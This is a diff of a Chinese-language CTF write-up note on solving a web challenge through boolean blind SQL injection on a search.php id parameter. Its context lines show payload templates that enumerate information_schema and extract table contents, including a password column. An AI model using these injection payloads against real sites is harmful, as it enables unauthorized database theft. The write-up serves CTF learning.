@@ -2,7 +2,9 @@
 
 ---
 首页长这样
+
 ![[Pasted image 20221214145759.png|700]]
+
 `flag`是不可能白送的，这辈子都是不可能白送的.jpg
 
 点击数字之后访问
@@ -10,6 +12,7 @@
 /search.php?id=xxx
 ```
 对于无效数字，响应是
+
 ![[Pasted image 20221214145910.png]]
 
 使用布尔盲注来获取数据库信息
@@ -41,6 +44,7 @@ for i in range(1, 200):
 
 ```
 `buuoj`这个429好严QAQ
+
 ![[Pasted image 20221214150250.png]]
 
 修改`fmt`来爆`geek`数据库的表
@@ -55,20 +59,29 @@ fmt = '0^(ord(substr((select(group_concat(column_name))from(information_schema.c
 fmt = '0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\'Flaaaaag\')),%d,1))>%d)'
 ```
 ![[Pasted image 20221214150759.png]]
+
 ![[Pasted image 20221214150844.png]]
 
 胜利近在咫尺
 ```python
 fmt = '0^(ord(substr((select(group_concat(fl4gawsl))from(geek.Flaaaaag)),%d,1))>%d)'
 ```
+
 ![[Pasted image 20221214151723.png]]
+
 ![[Pasted image 20221214151710.png|700]]
+
 谢谢有被出题人问候到
+
 被骗了，这个表存的好像是问候语
 ```python
 fmt = '0^(ord(substr((select(group_concat(password))from(geek.F1naI1y)),%d,1))>%d)'
 ```
+
 ![[Pasted image 20221214152922.png]]
+
 出离愤怒😡
+
 ![[Pasted image 20221214153534.png]]
+
 #Web #SQL注入 #布尔盲注 
